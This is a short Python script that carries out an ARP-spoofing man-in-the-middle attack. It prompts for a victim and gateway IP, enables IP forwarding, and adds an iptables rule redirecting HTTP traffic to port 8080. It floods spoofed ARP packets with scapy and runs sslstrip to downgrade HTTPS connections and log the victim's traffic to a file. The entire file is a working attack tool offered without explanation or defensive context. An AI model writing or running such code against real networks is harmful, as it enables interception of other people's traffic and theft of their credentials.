#!/usr/bin/env python

import os
from scapy.all import *
import threading

victim = raw_input("Enter the victim: ")
gw = raw_input("Gateway? ")
file = raw_input("Log file destination: ")

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")



def attack_victim(victim,gw):
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=gw,pdst=victim)
	while True:
		sendp(pkt)

def attack_gw(victim,gw):
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=victim,pdst=gw)
	while True:
		sendp(pkt)
def sslstrip(file):
	os.system("sslstrip -k -l 8080 -w " +file)

th_victim = threading.Thread(target=attack_victim,args=(victim,gw))
th_gw = threading.Thread(target=attack_gw,args=(victim,gw))
th_ssl = threading.Thread(target=sslstrip,args=(file,))

th_ssl.start()
th_victim.start()

# th_gw.start()

